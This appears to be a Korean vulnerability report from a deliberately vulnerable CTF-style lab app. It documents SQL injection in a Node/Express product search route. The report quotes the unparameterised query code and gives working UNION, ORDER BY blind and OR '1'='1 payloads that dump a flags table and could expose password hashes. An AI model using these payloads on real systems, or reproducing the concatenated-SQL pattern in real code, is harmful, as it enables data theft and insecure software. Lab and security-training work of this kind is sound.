# VULN-001 SQL Injection in product search/filter/sort

- 대상 스택: node-express
- 심각도: Critical
- 분류: A03:2021 Injection (SQL Injection)

## 위치

`apps/node-express/src/routes/products.js`, `GET /api/products` — `q`, `category`, `sort` 쿼리 파라미터를 파라미터 바인딩 없이 SQL 문자열에 직접 이어붙인다.

```js
let sql = 'SELECT * FROM products WHERE 1=1';
if (q) sql += ` AND name LIKE '%${q}%'`;
if (category) sql += ` AND category = '${category}'`;
sql += ` ORDER BY ${sort || 'id'}`;
```

## 트리거 방법 (UNION 기반, `flags` 테이블 덤프)

```
GET /api/products?category=nonexistent' UNION SELECT 0, vuln_id, flag_value, 0, '', '', captured_at FROM flags -- 
```

`products` 테이블 컬럼 순서(`id, name, description, price, image_url, category, created_at`)에 맞춰 `flags` 테이블을 UNION SELECT하면, 응답의 `products` 배열에 `name=VULN-001`, `description=<FLAG_VULN_001 값>`인 가짜 상품이 섞여 나온다.

`sort` 파라미터도 `ORDER BY`에 그대로 들어가므로 blind/error-based 인젝션 지점으로 별도 사용 가능 (예: `sort=(SELECT CASE WHEN (1=1) THEN id ELSE name END)`).

`q` 파라미터 역시 동일하게 취약 (`' OR '1'='1` 류의 조건 우회).

## 영향

- `users` 테이블의 `password_hash`를 포함한 임의 테이블 덤프 가능.
- `flags` 테이블을 통해 아직 공개되지 않은 다른 VULN의 플래그까지 노출될 수 있음.

## 플래그

`FLAG_VULN_001` (루트 `.env`) → 위 UNION 페이로드로 `products` 응답에서 획득.

## 조치 상태: 미조치
